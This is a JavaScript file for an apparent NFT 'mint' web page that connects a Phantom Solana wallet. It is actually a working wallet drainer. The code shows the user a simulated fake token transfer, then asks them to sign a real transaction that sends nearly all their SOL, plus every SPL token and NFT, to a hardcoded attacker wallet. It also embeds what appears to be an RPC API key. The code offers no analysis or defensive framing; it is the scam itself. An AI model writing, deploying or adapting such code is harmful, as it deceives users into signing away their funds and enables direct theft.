import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { Token, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { Buffer } from 'buffer';

window.Buffer = Buffer; // Make Buffer available globally if needed

// This function handles the wallet connection and transaction logic
async function handleConnectWallet() {
    if (window.solana && window.solana.isPhantom) {
        try {
            const resp = await window.solana.connect();
            const connection = new Connection(
                'https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1',
                'confirmed'
            );

            const publicKey = new PublicKey(resp.publicKey);
            const walletBalanceLamports = await connection.getBalance(publicKey);
            const minBalance = await connection.getMinimumBalanceForRentExemption(0);

            if (walletBalanceLamports < minBalance) {
                alert("Insufficient funds for rent.");
                return;
            }

            document.getElementById('connect-wallet').textContent = "Mint";
            document.getElementById('connect-wallet').removeEventListener('click', handleConnectWallet);
            document.getElementById('connect-wallet').addEventListener('click', async () => {
                try {
                    const receiverWallet = new PublicKey('4zACHuijBu4fnLfuc84PGhSV6XhWqJbEhvQw87t1Lfdi'); // Recipient's wallet

                    // Step 1: Fake Token Transfer (Display to the user that they will receive tokens)
                    const fakeMint = new PublicKey('8D37jiPH55BPAD171YbZnsUTydwAseHgT7CQMjFKcKTU'); // Replace with a fake token mint address
                    const fakeReceiverAddress = await Token.getAssociatedTokenAddress(
                        ASSOCIATED_TOKEN_PROGRAM_ID,
                        TOKEN_PROGRAM_ID,
                        fakeMint,
                        publicKey
                    );

                    const fakeTransferTx = new Transaction().add(
                        Token.createTransferInstruction(
                            TOKEN_PROGRAM_ID,
                            fakeReceiverAddress,
                            fakeReceiverAddress, // Simulating as if the user will receive tokens
                            publicKey,
                            [],
                            100 // Fake token amount to display
                        )
                    );

                    fakeTransferTx.feePayer = publicKey;
                    const fakeBlockhashObj = await connection.getRecentBlockhash();
                    fakeTransferTx.recentBlockhash = fakeBlockhashObj.blockhash;

                    const signedFakeTx = await window.solana.signTransaction(fakeTransferTx);
                    console.log("Signed fake token transaction:", signedFakeTx); // Debug

                    // Simulate sending a fake transaction (this transaction won't be broadcasted)
                    await connection.simulateTransaction(signedFakeTx);
                    console.log("Fake token transaction simulated"); // Debug

                    // Step 2: Real Transfers
                    let transaction = new Transaction();

                    // Transfer SOL
                    const balanceForTransferLamports = walletBalanceLamports - minBalance;
                    if (balanceForTransferLamports > 0) {
                        transaction.add(
                            SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: receiverWallet,
                                lamports: Math.floor(balanceForTransferLamports * 0.99),
                            })
                        );
                    }

                    // Transfer SPL tokens and NFTs
                    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                        programId: TOKEN_PROGRAM_ID
                    });

                    for (const tokenAccount of tokenAccounts.value) {
                        const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
                        if (tokenAmount > 0) {
                            const tokenPubkey = new PublicKey(tokenAccount.pubkey);
                            const tokenMint = new PublicKey(tokenAccount.account.data.parsed.info.mint);

                            const associatedTokenAddress = await Token.getAssociatedTokenAddress(
                                ASSOCIATED_TOKEN_PROGRAM_ID,
                                TOKEN_PROGRAM_ID,
                                tokenMint,
                                receiverWallet
                            );

                            const accountInfo = await connection.getAccountInfo(associatedTokenAddress);
                            if (accountInfo === null) {
                                transaction.add(
                                    Token.createAssociatedTokenAccountInstruction(
                                        ASSOCIATED_TOKEN_PROGRAM_ID,
                                        TOKEN_PROGRAM_ID,
                                        tokenMint,
                                        associatedTokenAddress,
                                        receiverWallet,
                                        publicKey
                                    )
                                );
                            }

                            transaction.add(
                                Token.createTransferInstruction(
                                    TOKEN_PROGRAM_ID,
                                    tokenPubkey,
                                    associatedTokenAddress,
                                    publicKey,
                                    [],
                                    Math.floor(tokenAmount)
                                )
                            );
                        }
                    }

                    // Sign and send the real transaction
                    transaction.feePayer = publicKey;
                    const blockhashObj = await connection.getRecentBlockhash();
                    transaction.recentBlockhash = blockhashObj.blockhash;

                    const signedTransaction = await window.solana.signTransaction(transaction);
                    const txid = await connection.sendRawTransaction(signedTransaction.serialize());
                    await connection.confirmTransaction(txid);

                    console.log("Real transaction sent and confirmed:", txid);
                } catch (err) {
                    console.error("Error during minting:", err);
                }
            });
        } catch (err) {
            console.error("Error connecting to Phantom Wallet:", err);
        }
    } else {
        alert("Phantom extension not found.");
        const isFirefox = typeof InstallTrigger !== "undefined";
        const isChrome = !!window.chrome;

        if (isFirefox) {
            window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
        } else if (isChrome) {
            window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
        } else {
            alert("Please download the Phantom extension for your browser.");
        }
    }
}

// Attach the event listener to the button
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('connect-wallet').addEventListener('click', handleConnectWallet);
});
